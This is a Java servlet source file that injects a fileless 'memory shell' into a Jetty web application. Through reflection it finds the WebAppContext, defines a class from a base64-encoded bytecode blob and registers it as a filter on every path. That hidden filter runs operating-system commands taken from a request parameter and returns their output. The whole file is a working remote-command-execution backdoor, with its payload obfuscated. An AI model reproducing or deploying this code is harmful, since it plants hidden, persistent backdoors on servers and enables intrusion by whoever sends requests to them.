package test;

import sun.misc.BASE64Decoder;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.EventListener;

public class InjectFilterByServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            Object var1 = getContext();
            injectMemShell(var1);
        } catch (NoSuchFieldException | IllegalAccessException | ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    public static synchronized Object getContext() throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        Thread thread=Thread.currentThread();
        Field f1=thread.getClass().getDeclaredField("threadLocals");
        f1.setAccessible(true);
        Object o1=f1.get(thread);
        Field f2=o1.getClass().getDeclaredField("table");
        f2.setAccessible(true);
        Object o3=f2.get(o1);

        Class var7 = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
        Field var8 = var7.getDeclaredField("value");
        var8.setAccessible(true);
        Object var9 = null;
//        ThreadLocal.ThreadLocalMap.Entry[] o3=(ThreadLocal.ThreadLocalMap.Entry[]) f2.get(o1);

        for(int var11 = 0; var11 < Array.getLength(o3); ++var11) {
            Object var10 = Array.get(o3, var11);
            if (var10 != null) {
                var9 = var8.get(var10);
                if (var9 != null && var9.getClass().getName().equals("org.eclipse.jetty.webapp.WebAppContext$Context")) {
                    Field f3=var9.getClass().getDeclaredField("this$0");
                    f3.setAccessible(true);
                    Object o4=f3.get(var9);
                    return o4; //WebAppContext
                }
            }
        }
        return null;
    }

    public static synchronized void injectMemShell(Object context){
        try{
            Object MEMSHELL_OBJECT=injectMemShellClass();
            Class var2 = Thread.currentThread().getContextClassLoader().loadClass(MEMSHELL_OBJECT.getClass().getName());


            Field f1=context.getClass().getSuperclass().getDeclaredField("_servletHandler");
            f1.setAccessible(true);
            Object servletHandler=f1.get(context);

            Method var3 = servletHandler.getClass().getDeclaredMethod("addFilterWithMapping", Class.class, String.class, Integer.TYPE);
            var3.setAccessible(true);
            var3.invoke(servletHandler, var2, "/*", 1);
            // WebAppContext -> ServletContextHandler -> ContextHandler
        }catch(Exception e){

        }
    }

    public static Object injectMemShellClass() {
        try {
            Method var1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            var1.setAccessible(true);
            byte[] var2 = (new BASE64Decoder()).decodeBuffer("yv66vgAAADQAxQoAIQBzBwB0CgAoAHUIAHYLAAIAdwoAKAB4CwAjAHkKAHoAewcAfAoACQB9CgB+AH8KAH4AgAoAgQCCBwCDCgAOAIQHAIUKABAAhgcAhwoAEgBzCgAQAIgHAIkKABUAcwoAFQCKCACLCgAVAIwKABIAjQoAEgCMCgAhAI4IAI8HAJAKAB4AkQoAkgCTBwCUCgCSAJUHAJYHAJcHAJgHAJkKAJoAfQcAmwcAnAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAKTE15RmlsdGVyOwEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACkV4Y2VwdGlvbnMHAJ0BAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAANjbWQBABJMamF2YS9sYW5nL1N0cmluZzsBAAZyZXN1bHQBAAR2YXI4AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAHcmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEABWNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQADcmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAEcmVzcAEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAA1TdGFja01hcFRhYmxlBwCbBwCeBwCfBwCgBwB0BwCWBwB8BwChAQAHZGVzdHJveQEAC0NvbW1hbmRFeGVjAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAJydAEAE0xqYXZhL2xhbmcvUnVudGltZTsBAARwcm9jAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEABnN0ZGVycgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAA2lzcgEAG0xqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyOwEAAmJyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAEbGluZQEAAnNiAQAYTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7BwCiBwCjBwCkBwClBwCDBwCFBwCHAQAWZ2V0UmVzcG9uc2VGcm9tUmVxdWVzdAEAUShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDspTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAAm0xAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAFlAQAoTGphdmEvbGFuZy9SZWZsZWN0aXZlT3BlcmF0aW9uRXhjZXB0aW9uOwEABHZhcjEBAAR2YXIyBwCmAQAKU291cmNlRmlsZQEADU15RmlsdGVyLmphdmEMACoAKwEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QMAGgAaQEABmZpbHRlcgwApwBTDABSAFMMAKgAqQcAqgwAqwCsAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwArQArBwCjDACuAK8MALAAsQcApAwAsgCzAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAKgC0AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgwAKgC1AQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwAtgC3AQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMALgAuQEAAQoMALoAtwwAuAC7DAC8AL0BAAtnZXRSZXNwb25zZQEAD2phdmEvbGFuZy9DbGFzcwwAvgC/BwDADADBAMIBABBqYXZhL2xhbmcvT2JqZWN0DADDAMQBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24BACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgEAK2phdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb24HAKYBAAhNeUZpbHRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1J1bnRpbWUBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BACZqYXZhL2xhbmcvUmVmbGVjdGl2ZU9wZXJhdGlvbkV4Y2VwdGlvbgEADGdldFBhcmFtZXRlcgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA9wcmludFN0YWNrVHJhY2UBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwAhACgAIQABACkAAAAGAAEAKgArAAEALAAAAC8AAQABAAAABSq3AAGxAAAAAgAtAAAABgABAAAACwAuAAAADAABAAAABQAvADAAAAABADEAMgACACwAAAA1AAAAAgAAAAGxAAAAAgAtAAAABgABAAAADwAuAAAAFgACAAAAAQAvADAAAAAAAAEAMwA0AAEANQAAAAQAAQA2AAEANwA4AAIALAAAAQYAAgAIAAAAOyvAAAI6BAE6BSoZBLYAAzoFGQQSBLkABQIAOgYqGQa2AAY6BxkFuQAHAQAZB7YACKcACjoGGQa2AAqxAAEACQAwADMACQADAC0AAAAqAAoAAAATAAYAFAAJABcAEQAYABwAGQAkABoAMAAdADMAGwA1ABwAOgAfAC4AAABcAAkAHAAUADkAOgAGACQADAA7ADoABwA1AAUAPAA9AAYAAAA7AC8AMAAAAAAAOwA+AD8AAQAAADsAQABBAAIAAAA7AEIAQwADAAYANQBEAEUABAAJADIARgBHAAUASAAAAB8AAv8AMwAGBwBJBwBKBwBLBwBMBwBNBwBOAAEHAE8GADUAAAAGAAIAUAA2AAEAUQArAAEALAAAACsAAAABAAAAAbEAAAACAC0AAAAGAAEAAAAkAC4AAAAMAAEAAAABAC8AMAAAAAEAUgBTAAIALAAAASkAAwAJAAAAYLgAC00sK7YADE4ttgANOgS7AA5ZGQS3AA86BbsAEFkZBbcAEToGAToHuwASWbcAEzoIGQa2ABRZOgfGACAZCLsAFVm3ABYZB7YAFxIYtgAXtgAZtgAaV6f/2xkItgAbsAAAAAMALQAAACoACgAAACcABAAoAAoAKQAQACoAGwArACYALAApAC0AMgAuAD0ALwBaADEALgAAAFwACQAAAGAALwAwAAAAAABgADkAOgABAAQAXABUAFUAAgAKAFYAVgBXAAMAEABQAFgAWQAEABsARQBaAFsABQAmADoAXABdAAYAKQA3AF4AOgAHADIALgBfAGAACABIAAAAJQAC/wAyAAkHAEkHAGEHAGIHAGMHAGQHAGUHAGYHAGEHAGcAACcANQAAAAQAAQAJAAEAaABpAAEALAAAAM4AAwAEAAAALAFNK7YAHBIdA70AHrYAH04tBLYAIC0rA70AIbYAIsAAI02nAAhOLbYAJyywAAMAAgAiACUAJAACACIAJQAlAAIAIgAlACYAAwAtAAAAIgAIAAAANQACADcAEAA4ABUAOQAiADwAJQA6ACYAOwAqAD0ALgAAADQABQAQABIAagBrAAMAJgAEAGwAbQADAAAALAAvADAAAAAAACwAbgBFAAEAAgAqAG8ARwACAEgAAAAWAAL/ACUAAwcASQcATQcATgABBwBwBAABAHEAAAACAHI=");
            Class var3 = (Class) var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);
            Object MEMSHELL_OBJECT = var3.newInstance();
            return MEMSHELL_OBJECT;
        } catch (Exception var4) {
        }
        return null;
    }
}
